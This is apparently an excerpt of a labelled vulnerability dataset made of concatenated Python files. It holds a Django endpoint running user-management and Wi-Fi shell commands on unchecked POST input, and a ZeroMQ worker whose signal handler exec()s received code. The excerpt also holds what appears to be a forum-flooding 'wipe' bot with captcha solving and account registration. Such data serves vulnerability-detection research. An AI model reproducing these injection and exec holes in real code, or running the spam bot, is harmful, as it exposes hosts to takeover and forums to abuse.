        elif action == 'logout':
            print(action)
            username = request.POST.get(""username"")
            print(username+' ')
            queryset = User.objects.all().first()
            if username == queryset.username:
                return JsonResponse({""STATUS"":""SUCCESS"", ""username"":queryset.username}, safe=False)
        elif action == 'getDashboardCards':
            print(action)
            con = sqlite3.connect(""dashboard.sqlite3"")
            cursor = con.cursor()
            cursor.execute(common.Q_DASHBOARD_CARDS)
            rows = cursor.fetchall()
            print(rows)
            return JsonResponse(rows, safe=False)
        elif action == 'getDashboardChart':
            print(action)
            con = sqlite3.connect(""dashboard.sqlite3"")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            for row in rows:
                cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],])
                datasets = cursor.fetchall()
                print(datasets)
                data = {'container_name' : row[1], 'data': datasets}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getDockerOverview':
            print(action)
            con = sqlite3.connect(""dashboard.sqlite3"")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_DOCKER_OVERVIEW)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            for row in rows:
                data = {'state': row[0], 'container_id': row[1], 'name': row[2],
                        'image': row[3], 'running_for': row[4],
                        'command': row[5], 'ports': row[6],
                        'status': row[7], 'networks': row[8]}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getContainerStats':
            print(action)
            con = sqlite3.connect(""dashboard.sqlite3"")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            datasets_io = []
            datasets_mem = []
            datasets_perc = []
            for row in rows:
                datasets_io = []
                datasets_mem = []
                datasets_perc = []
                # values with % appended to them
                for iter in range(0,2):
                    cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_perc.append(counter_val)
                # values w/o % appended to them
                for iter in range(2,4):
                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_mem.append(counter_val)
                # values w/o % appended to them
                for iter in range(4,8):
                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_io.append(counter_val)
                data = {'container_id': row[0], 'container_name' : row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getThreads':
            print(action)
            rows = []
            ps = subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0]
            processes = ps.decode().split('\n')
            # this specifies the number of splits, so the splitted lines
            # will have (nfields+1) elements
            nfields = len(processes[0].split()) - 1
            for row in processes[4:]:
                rows.append(row.split(None, nfields))
            return JsonResponse(rows, safe=False)
        elif action == 'getContainerTop':
            print(action)
            con = sqlite3.connect(""dashboard.sqlite3"")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            resultset = []
            for i in rows:
                data = {}
                datasets = []
                ps = subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0]
                processes = ps.decode().split('\n')
                # this specifies the number of splits, so the splitted lines
                # will have (nfields+1) elements
                nfields = len(processes[0].split()) - 1
                for p in processes[1:]:
                    datasets.append(p.split(None, nfields))
                data = {'container_id': i[0], 'container_name' : i[1], 'data': datasets}
                resultset.append(data)
            return JsonResponse(resultset, safe=False)
        elif action == 'getSettings':
            print(action)
            ps = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = ps.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False)
        elif action == 'deleteUser':
            print(action)
            username = escape(request.POST.get(""user""))
            ps = subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate()
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False)
        elif action == 'addNewUser':
            print(action)
            username = escape(request.POST.get(""username""))
            password = escape(request.POST.get(""password""))
            add_user(username,password)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False)
        elif action == 'addWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_pass = escape(request.POST.get(""wifi_password""))
            wifi_name = request.POST.get(""wifi_ap"")
            if len(wifi_name) > 0:
                add_newWifiConn(wifi_name,wifi_pass)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False)
        elif action == 'deleteWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_name = request.POST.get(""wifi"")
            delete_WifiConn(wifi_name)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False)
        elif action == 'editWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_name = request.POST.get(""wifi_ap"")
            wifi_pass = escape(request.POST.get(""wifi_password""))
            edit_WifiConn(wifi_name,wifi_pass)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False)
        return JsonResponse(serializer.errors, status=400)

def index(request):
    return render(request, 'index.html')

class BoxDetailsViewSet(viewsets.ModelViewSet):
    queryset = BoxDetails.objects.all()
    serializer_class = BoxDetailsSerializer

class RegisteredServicesViewSet(viewsets.ModelViewSet):
    queryset = RegisteredServices.objects.all()
    serializer_class = RegisteredServicesSerializer    


/n/n/n",1,remote_code_execution
4,84,42b020edfe6b23b245938d23ff7a0484333d6450,"evproxy.py/n/n# -*- coding: utf-8 -*-
# -*- mode: python -*-
import wzrpc
from sup.ticker import Ticker

class EvaluatorProxy:
    def __init__(self, ev_init, *args, **kvargs):
        super().__init__()
        self.ev_init = ev_init
        self.bind_kt_ticker = Ticker()
        self.bind_kt = 5

    def handle_evaluate(self, reqid, interface, method, data):
        domain, page = data
        self.p.log.info('Recvd page %s, working on', reqid)
        res = self.ev.solve_capage(domain, page)
        self.p.log.info('Done, sending answer: %s', res)
        self.p.send_success_rep(reqid, [v.encode('utf-8') for v in res])

    def send_keepalive(self):
        msg = self.p.wz.make_req_msg(b'Router', b'bind-keepalive', [],
            self.handle_keepalive_reply)
        msg.insert(0, b'')
        self.p.wz_sock.send_multipart(msg)

    def handle_keepalive_reply(self, reqid, seqnum, status, data):
        if status == wzrpc.status.success:
            self.p.log.debug('Keepalive was successfull')
        elif status == wzrpc.status.e_req_denied:
            self.p.log.warn('Keepalive status {0}, reauthentificating and rebinding'.
                format(wzrpc.name_status(status)))
            self.p.auth_requests()
            self.p.bind_methods()
        elif status == wzrpc.status.e_timeout:
            self.p.log.warn('Keepalive timeout')
        else:
            self.p.log.warn('Keepalive status {0}'.
                format(wzrpc.name_status(status)))

    def __call__(self, parent):
        self.p = parent
        self.p.wz_connect()
        self.p.wz_auth_requests = [
            (b'Router', b'auth-bind-route'),
            (b'Router', b'auth-unbind-route'),
            (b'Router', b'auth-set-route-type')]
        self.p.wz_bind_methods = [
            (b'Evaluator', b'evaluate', self.handle_evaluate, wzrpc.routetype.random)]
        self.p.auth_requests()
        self.p.bind_methods()
        self.ev = self.ev_init()
        self.bind_kt_ticker.tick()
        while self.p.running.is_set():
            self.p.poll()
            if self.bind_kt_ticker.elapsed(False) > self.bind_kt:
                self.bind_kt_ticker.tick()
                self.send_keepalive()
/n/n/nlib/wzrpc/wzbase.py/n/n# -*- coding: utf-8 -*-
# -*- mode: python -*-
from . import *

class WZBase(object):
    def make_error_msg(self, iden, status):
        msg = []
        if iden:
            msg.extend(iden)
            msg.append(b'')
        msg.append(header_struct.pack(wzstart, wzversion, msgtype.err))
        msg.append(error_struct.pack(status))
        return msg

    def parse_msg(self, iden, msg):
        if len(msg) == 0 or not msg[0].startswith(wzstart):
            raise WZENoWZ('Not a WZRPC message {0} from {1}'.format(msg, repr(iden)))
        try:
            hsize = header_struct.size # locals are faster
            wz, ver, type_ = header_struct.unpack(msg[0][:hsize])
        except Exception as e:
            raise
        if int(ver) != wzversion:
            raise WZEWrongVersion(iden, 'Wrong message version')
        if type_ == msgtype.req:
            unpacked = []
            for v in req_struct.unpack(msg[0][hsize:]):
                if type(v) == bytes:
                    v = v.partition(b'\0')[0]
                unpacked.append(v)
            return self._parse_req(iden, msg, *unpacked)
        elif type_ == msgtype.rep:
            unpacked = rep_struct.unpack(msg[0][hsize:])
            return self._parse_rep(iden, msg, *unpacked)
        elif type_ == msgtype.sig:
            unpacked = []
            for v in sig_struct.unpack(msg[0][hsize:]):
                if type(v) == bytes:
                    v = v.partition(b'\0')[0]
                unpacked.append(v)
            return self._parse_sig(iden, msg, *unpacked)
        elif type_ == msgtype.err:
            unpacked = error_struct.unpack(msg[0][hsize:])
            return self._parse_err(iden, msg, *unpacked)
        elif type_ == msgtype.nil:
            return self._handle_nil(iden, msg)
        else:
            raise WZEUnknownType(iden, 'Unknown message type')
        
    def parse_router_msg(self, frames):
        base, msg = split_frames(frames)
        return self.parse_msg(base[:-1], msg)
/n/n/nlib/wzrpc/wzhandler.py/n/n# -*- coding: utf-8 -*-
# -*- mode: python -*-
from . import *
from .wzbase import WZBase

class WZHandler(WZBase):
    def __init__(self):
        self.req_handlers = {}
        self.response_handlers = {}
        self.sig_handlers = {}
        self.iden_reqid_map = BijectiveSetMap()

    def set_req_handler(self, interface, method, fun):
        self.req_handlers[(interface, method)] = fun

    def set_response_handler(self, reqid, fun):
        self.response_handlers[reqid] = fun

    def set_sig_handler(self, interface, method, fun):
        self.sig_handlers[(interface, method)] = fun

    def del_req_handler(self, interface, method):
        del self.req_handlers[(interface, method)]

    def del_response_handler(self, reqid):
        del self.response_handlers[reqid]

    def del_sig_handler(self, interface, method):
        del self.sig_handlers[(interface, method)]

    def _parse_req(self, iden, msg, reqid, interface, method):
        try:
            handler = self.req_handlers[(interface, method)]
        except KeyError:
            try:
                handler = self.req_handlers[(interface, None)]
            except KeyError:
                raise WZENoReqHandler(iden, reqid,
                    'No req handler for %s,%s'%(interface, method))
        if iden:
            self.iden_reqid_map.add_value(tuple(iden), reqid)
        handler(reqid, interface, method, msg[1:])
        return ()

    def _parse_rep(self, iden, msg, reqid, seqnum, status):
        try:
            handler = self.response_handlers[reqid]
            if seqnum == 0:
                del self.response_handlers[reqid]
        except KeyError:
            raise WZENoHandler(iden, 'No rep handler for reqid')
        handler(reqid, seqnum, status, msg[1:])
        return ()

    def _parse_sig(self, iden, msg, interface, method):
        try:
            handler = self.sig_handlers[(interface, method)]
        except KeyError:
            raise WZENoHandler(iden, 'No handler for sig %s,%s'%(interface, method))
        handler(interface, method, msg[1:])
        return ()

    def make_req_msg(self, interface, method, args, fun, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        msg = make_req_msg(interface, method, args, reqid)
        self.set_response_handler(reqid, fun)
        return msg

    def make_router_req_msg(self, iden, interface, method, args, fun, reqid=None):
        msg = iden[:]
        msg.append(b'')
        msg.extend(self.make_req_msg(interface, method, args, fun, reqid))
        return msg

    def make_router_rep_msg(self, reqid, seqnum, status, answer):
        iden = self.iden_reqid_map.get_key(reqid)
        if seqnum == 0:
            self.iden_reqid_map.del_value(iden, reqid)
        msg = list(iden)
        msg.append(b'')
        msg.extend(make_rep_msg(reqid, seqnum, status, answer))
        return msg

    def get_iden(self, reqid):
        return self.iden_reqid_map.get_key(reqid)

    def get_reqids(self, iden):
        return self.iden_reqid_map.get_values(iden)

    def make_reqid(self):
        while True:
            reqid = random.randint(1, (2**64)-1)
            if reqid not in self.response_handlers:
                return reqid

    def make_auth_req_data(self, interface, method, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, make_auth_hash(interface, method, reqid, key)]
        return (b'Router', b'auth-request', args, reqid)

    def make_auth_bind_route_data(self, interface, method, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, make_auth_hash(interface, method, reqid, key)]
        return (b'Router', b'auth-bind-route', args, reqid)

    def make_auth_unbind_route_data(self, interface, method, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, make_auth_hash(interface, method, reqid, key)]
        return (b'Router', b'auth-unbind-route', args, reqid)

    def make_auth_set_route_type_data(self, interface, method, type_, key, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        args = [interface, method, struct.pack('!B', type_),
                make_auth_hash(interface, method, reqid, key)]
        return (b'Router', b'auth-set-route-type', args, reqid)

    def make_auth_clear_data(self, reqid=None):
        if not reqid:
            reqid = self.make_reqid()
        return (b'Router', b'auth-clear', [], reqid)

    def req_from_data(self, d, fun):
        return self.make_req_msg(d[0], d[1], d[2], fun, d[3])

    def _parse_err(self, iden, msg, status):
        pass

    def _handle_nil(self, iden, msg):
        pass
/n/n/nlib/wzworkers.py/n/nimport zmq
import threading, multiprocessing
import logging
from sup.ticker import Ticker
# from sup import split_frames
import wzrpc
import exceptions
from wzrpc.wzhandler import WZHandler
import wzauth_data

class WorkerInterrupt(Exception):
    '''Exception to raise when self.running is cleared'''
    def __init__(self):
        super().__init__('Worker was interrupted at runtime')

class Suspend(Exception):
    # if we need this at all.
    '''Exception to raise on suspend signal'''
    def __init__(self, interval, *args, **kvargs):
        self.interval = interval
        super().__init__(*args, **kvargs)

class Resume(Exception):
    '''Exception to raise when suspend sleep is interrupted'''

class WZWorkerBase:
    def __init__(self, wz_addr, fun, args=(), kvargs={},
            name=None, start_timer=None, poll_timeout=None,
            pargs=(), pkvargs={}):
        super().__init__(*pargs, **pkvargs)
        self.name = name if name else type(self).__name__
        self.start_timer = start_timer
        self.poll_timeout = poll_timeout if poll_timeout else 5*1000
        self.call = (fun, args, kvargs)

        self.wz_addr = wz_addr
        self.wz_auth_requests = []
        self.wz_bind_methods = []
        self.wz_poll_timeout = 30 * 1000
        self.wz_retry_timeout = 5

    def __sinit__(self):
        '''Initializes thread-local interface on startup'''
        self.log = logging.getLogger(self.name)
        self.running = threading.Event()
        self.sleep_ticker = Ticker()
        self.poller = zmq.Poller()

        s = self.ctx.socket(zmq.SUB)
        self.poller.register(s, zmq.POLLIN)
        s.setsockopt(zmq.IPV6, True)
        s.connect(self.sig_addr)
        s.setsockopt(zmq.SUBSCRIBE, b'GLOBAL')
        s.setsockopt(zmq.SUBSCRIBE, b'WZWorker')
        s.setsockopt(zmq.SUBSCRIBE, bytes(self.name, 'utf-8'))
        self.sig_sock = s

        s = self.ctx.socket(zmq.DEALER)
        self.poller.register(s, zmq.POLLIN)
        s.setsockopt(zmq.IPV6, True)
        self.wz_sock = s

        self.wz = WZHandler()

        def term_handler(i, m, d):
            self.log.info(
                'Termination signal %s recieved',
                repr((i, m, d)))
            self.term()
            raise WorkerInterrupt()
        self.wz.set_sig_handler(b'WZWorker', b'terminate', term_handler)

        def execute_handler(i, m, d):
            if len(d) < 1:
                return
            try:
                exec(d[0].decode('utf-8'))
            except Exception as e:
                self.log.exception(e)
        self.wz.set_sig_handler(b'WZWorker', b'execute', execute_handler)

        def suspend_handler(i, m, d):
            if len(d) != 1:
                self.log.waring('Suspend signal without a time recieved, ignoring')
            self.log.info('Suspend signal %s recieved', repr((i, m, d)))
            try:
                t = int(d[0])
                # raise Suspend(t)
                self.inter_sleep(t)
            except Resume as e:
                self.log.info(e)
            except Exception as e:
                self.log.error(e)
        self.wz.set_sig_handler(b'WZWorker', b'suspend', suspend_handler)

        def resume_handler(i, m, d):
            self.log.info('Resume signal %s recieved', repr((i, m, d)))
            raise Resume()
        self.wz.set_sig_handler(b'WZWorker', b'resume', resume_handler)

        self.running.set()

    def wz_connect(self):
        self.wz_sock.connect(self.wz_addr)

    def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None):
        s, p, t = self.wz_sock, self.poll, self.sleep_ticker
        timeout = timeout if timeout else self.wz_poll_timeout
        rs = wzrpc.RequestState(fun)
        msg = self.wz.make_req_msg(interface, method, data,
                                   rs.accept, reqid)
        msg.insert(0, b'')
        s.send_multipart(msg)
        t.tick()
        while self.running.is_set():
            p(timeout*1000)
            if rs.finished:
                if rs.retry:
                    self.inter_sleep(self.wz_retry_timeout)
                    msg = self.wz.make_req_msg(interface, method, data,
                        rs.accept, reqid)
                    msg.insert(0, b'')
                    s.send_multipart(msg)
                    rs.finished = False
                    rs.retry = False
                    continue
                return
            elapsed = t.elapsed(False)
            if elapsed >= timeout:
                t.tick()
                # Notify fun about the timeout
                rs.accept(None, 0, 255, [elapsed])
                # fun sets rs.retry = True if it wants to retry
        raise WorkerInterrupt()

    def wz_multiwait(self, requests):
        # TODO: rewrite the retry loop
        s, p, t = self.wz_sock, self.poll, self.sleep_ticker
        timeout = self.wz_poll_timeout
        rslist = []
        msgdict = {}
        for request in requests:
            rs = wzrpc.RequestState(request[0])
            rslist.append(rs)
            msg = self.wz.make_req_msg(request[1][0], request[1][1], request[1][2],
                                    rs.accept, request[1][3])
            msg.insert(0, b'')
            msgdict[rs] = msg
            s.send_multipart(msg)
        while self.running.is_set():
            flag = 0
            for rs in rslist:
                if rs.finished:
                    if not rs.retry:
                        del msgdict[rs]
                        continue
                    s.send_multipart(msgdict[rs])
                    rs.finished = False
                    rs.retry = False
                flag = 1
            if not flag:
                return
            # check rs before polling, since we don't want to notify finished one
            # about the timeout
            t.tick()
            p(timeout*1000)
            if t.elapsed(False) >= timeout:
                for rs in rslist:
                    if not rs.finished:
                        rs.accept(None, 0, 255, []) # Notify fun about the timeout
                        rs.finished = True # fun sets rs.retry = True if it wants to retry
        raise WorkerInterrupt()

    def auth_requests(self):
        for i, m in self.wz_auth_requests:
            def accept(that, reqid, seqnum, status, data):
                if status == wzrpc.status.success:
                    self.log.debug('Successfull auth for (%s, %s)', i, m)
                elif status == wzrpc.status.e_auth_wrong_hash:
                    raise exceptions.PermanentError(
                        'Cannot authentificate for ({0}, {1}), {2}: {3}'.\
                        format(i, m, wzrpc.name_status(status), repr(data)))
                elif wzrpc.status.e_timeout:
                    self.log.warn('Timeout {0}, retrying'.format(data[0]))
                    that.retry = True
                else:
                    self.log.warning('Recvd unknown reply for (%s, %s) %s: %s', i, m,
                        wzrpc.name_status(status), repr(data))
            self.wz_wait_reply(accept,
                *self.wz.make_auth_req_data(i, m, wzauth_data.request[i, m]))


    def bind_route(self, i, m, f):
        self.log.debug('Binding %s,%s route', i, m)
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.wz.set_req_handler(i, m, f)
                self.log.debug('Succesfully binded route (%s, %s)', i, m)
            elif status == wzrpc.status.e_req_denied:
                self.log.warn('Status {0}, reauthentificating'.\
                    format(wzrpc.name_status(status)))
                self.auth_requests()
            elif wzrpc.status.e_timeout:
                self.log.warn('Timeout {0}, retrying'.format(data[0]))
                that.retry = True
            else:
                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))
                that.retry = True
        return self.wz_wait_reply(accept,
                *self.wz.make_auth_bind_route_data(i, m, wzauth_data.bind_route[i, m]))

    def set_route_type(self, i, m, t):
        self.log.debug('Setting %s,%s type to %d', i, m, t)
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.log.debug('Succesfully set route type for (%s, %s) to %s', i, m,
                    wzrpc.name_route_type(t))
            elif status == wzrpc.status.e_req_denied:
                self.log.warn('Status {0}, reauthentificating'.\
                    format(wzrpc.name_status(status)))
                self.auth_requests()
            else:
                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))
                that.retry = True
        return self.wz_wait_reply(accept,
            *self.wz.make_auth_set_route_type_data(i, m, t,
                wzauth_data.set_route_type[i, m]))

    def unbind_route(self, i, m):
        if not (i, m) in self.wz.req_handlers:
            self.log.debug('Route %s,%s was not bound', i, m)
            return
        self.log.debug('Unbinding route %s,%s', i, m)
        self.wz.del_req_handler(i, m)
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.log.debug('Route unbinded for (%s, %s)', i, m)
            else:
                self.log.warn('Status %s, passing', wzrpc.name_status(status))
        return self.wz_wait_reply(accept,
            *self.wz.make_auth_unbind_route_data(i, m, wzauth_data.bind_route[i, m]))

    def clear_auth(self):
        self.log.debug('Clearing our auth records')
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.log.debug('Auth records on router were cleared')
            else:
                self.log.warn('Status %s, passing', wzrpc.name_status(status))
        return self.wz_wait_reply(accept, *self.wz.make_auth_clear_data())

    def bind_methods(self):
        for i, m, f, t in self.wz_bind_methods:
            self.set_route_type(i, m, t)
            self.bind_route(i, m, f)

    def unbind_methods(self):
        for i, m, f, t in self.wz_bind_methods:
            self.unbind_route(i, m)
        # self.clear_auth()

    def send_rep(self, reqid, seqnum, status, data):
        self.wz_sock.send_multipart(
            self.wz.make_router_rep_msg(reqid, seqnum, status, data))

    def send_success_rep(self, reqid, data):
        self.send_rep(reqid, 0, wzrpc.status.success, data)

    def send_error_rep(self, reqid, data):
        self.send_rep(reqid, 0, wzrpc.status.error, data)

    def send_wz_error(self, reqid, data, seqid=0):
        msg = self.wz.make_dealer_rep_msg(
            reqid, seqid, wzrpc.status.error, data)
        self.wz_sock.send_multipart(msg)

    def send_to_router(self, msg):
        msg.insert(0, b'')
        self.wz_sock.send_multipart(msg)
    
    # def bind_sig_route(self, routetype, interface, method, fun):
    #     self.log.info('Binding %s,%s as type %d signal route',
    #                   interface, method, routetype)
    #     self.wz.set_signal_handler(interface, method, fun)
    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'bind-sig-route',
    #                                       [interface, method],
    #                                       self.accept_ok)
    #     self.wz_sock.send_multipart(msg)

    # def unbind_sig_route(self, interface, method):
    #     self.log.info('Deleting %s,%s signal route', interface, method)
    #     self.wz.del_signal_handler(interface, method)
    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'unbind-sig-route',
    #                                       [interface, method],
    #                                       self.accept_ok)
    #     self.wz_sock.send_multipart(msg)

    def inter_sleep(self, timeout):
        self.sleep_ticker.tick()
        while self.sleep_ticker.elapsed(False) < timeout:
            try:
                self.poll(timeout * 1000)
            except Resume:
                return

    def poll(self, timeout=None):
        try:
            socks = dict(self.poller.poll(timeout if timeout is not None
                else self.poll_timeout))
        except zmq.ZMQError as e:
            self.log.error(e)
            return
        if socks.get(self.sig_sock) == zmq.POLLIN:
            # No special handling or same-socket replies are necessary for signals.
            # Backwards socket replies may be added here.
            frames = self.sig_sock.recv_multipart()
            try:
                self.wz.parse_msg(frames[0], frames[1:])
            except wzrpc.WZError as e:
                self.log.warn(e)
        if socks.get(self.wz_sock) == zmq.POLLIN:
            self.process_wz_msg(self.wz_sock.recv_multipart())
        return socks

    def process_wz_msg(self, frames):
        try:
            for nfr in self.wz.parse_router_msg(frames):
                # Send replies from the handler, for cases when its methods were rewritten
                self.wz_sock.send_multipart(nfr)
        except wzrpc.WZErrorRep as e:
            self.log.info(e)
            self.wz_sock.send_multipart(e.rep_msg)
        except wzrpc.WZError as e:
            self.log.warn(e)

    def run(self):
        self.__sinit__()
        if self.start_timer:
            self.inter_sleep(self.start_timer)
        if self.running:
            self.log.info('Starting')
            try:
                self.child = self.call[0](*self.call[1], **self.call[2])
                self.child(self)
            except WorkerInterrupt as e:
                self.log.warn(e)
            except Exception as e:
                self.log.exception(e)
            self.log.info('Terminating')
        else:
            self.log.info('Aborted')
        self.running.set() # wz_multiwait needs this to avoid another state check.
        self.unbind_methods()
        self.running.clear()
        self.wz_sock.close()
        self.sig_sock.close()

    def term(self):
        self.running.clear()


class WZWorkerThread(WZWorkerBase, threading.Thread):
    def start(self, ctx, sig_addr, *args, **kvargs):
        self.ctx = ctx
        self.sig_addr = sig_addr
        threading.Thread.start(self, *args, **kvargs)

class WZWorkerProcess(WZWorkerBase, multiprocessing.Process):
    def start(self, sig_addr, *args, **kvargs):
        self.sig_addr = sig_addr
        multiprocessing.Process.start(self, *args, **kvargs)

    def __sinit__(self):
        self.ctx = zmq.Context()
        super().__sinit__()
/n/n/nunistart.py/n/n#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- mode: python -*-
import sys
if 'lib' not in sys.path:
    sys.path.append('lib')
import os, signal, logging, threading, re, traceback, time
import random
import zmq
from queue import Queue
import sup
import wzworkers as workers
from dataloader import DataLoader
from uniwipe import UniWipe
from wipeskel import *
import wzrpc
from beon import regexp
import pickle

from logging import config
from logconfig import logging_config
config.dictConfig(logging_config)
logger = logging.getLogger()

ctx = zmq.Context()
sig_addr = 'ipc://signals'
sig_sock = ctx.socket(zmq.PUB)
sig_sock.bind(sig_addr)

# Settings for you
domains = set() # d.witch_domains
targets = dict() # d.witch_targets
protected = set() # will be removed later
forums = dict() # target forums

# from lib import textgen
# with open('data.txt', 'rt') as f:
#     model = textgen.train(f.read())
# def mesasge():
#     while True:
#         s = textgen.generate_sentence(model)
#         try:
#             s.encode('cp1251')
#             break
#         except Exception:
#             continue
#     return s

def message():
    msg = []
    # msg.append('[video-youtube-'+
    #            random.choice(('3odl-KoNZwk', 'bu55q_3YtOY', '4YPiCeLwh5o',
    #                           'eSBybJGZoCU', 'ZtWTUt2RZh0', 'VXa9tXcMhXQ',))
    #            +']')
    msg.append('[image-original-none-http://simg4.gelbooru.com/'
               + '/images/db/1d/db1dfb62a40f5ced2043bb8966da9a98.png]')
    msg.append('Каждый хочет дружить с ядерной бомбой.')
    # msg.append('[video-youtube-'+random.choice(
    #     # ('WdDb_RId-xU', 'EFL1-fL-WtM', 'uAOoiIkFQq4',
    #     #  'eZO3K_4yceU', '1c1lT_HgJNo', 'WOkvVVaJ2Ks',
    #     #  'KYq90TEdxIE', 'rWBM2whL0bI', '0PDy_MKYo4A'))
    #     #('GabBLLOT6vw', 'qgvOpSquCAY', 'zUe-z9DZBNo', '4fCbfDEKZss', 'uIE-JgmkmdM'))
    #     ('42JQYPioVo4', 'jD6j072Ep1M', 'mPyF5ovoIVs', 'cEEi1BHycb0', 'PuA1Wf8nkxw',
    #      'ASJ9qlsPgHU', 'DP1ZDW9_xOo', 'bgSqH9LT-mI', ))
    # +']')
    # http://simg2.gelbooru.com//images/626/58ca1c9a8ffcdedd0e2eb6f33c9389cb7588f0d1.jpg
    # msg.append('Enjoy the view!')
    msg.append(str(random.randint(0, 9999999999)))
    return '\n'.join(msg)

def sbjfun():
    # return 'Out of the darkness we will rise, into the light we will dwell'
    return sup.randstr(1, 30)

# End
import argparse

parser = argparse.ArgumentParser(add_help=True)
parser.add_argument('--only-cache', '-C', action='store_true',
    help=""Disables any requests in DataLoader (includes Witch)"")
parser.add_argument('--no-shell', '-N', action='store_true',
    help=""Sleep instead of starting the shell"")
parser.add_argument('--tcount', '-t', type=int, default=10,
    help='WipeThread count')
parser.add_argument('--ecount', '-e', type=int, default=0,
    help='EvaluatorProxy count')
parser.add_argument('--upload-avatar', action='store_true', default=False,
    help='Upload random avatar after registration')
parser.add_argument('--av-dir', default='randav', help='Directory with avatars')
parser.add_argument('--rp-timeout', '-T', type=int, default=10,
    help='Default rp timeout in seconds')
parser.add_argument('--conlimit', type=int, default=3,
    help='http_request conlimit')
parser.add_argument('--noproxy-timeout', type=int, default=5,
    help='noproxy_rp timeout')

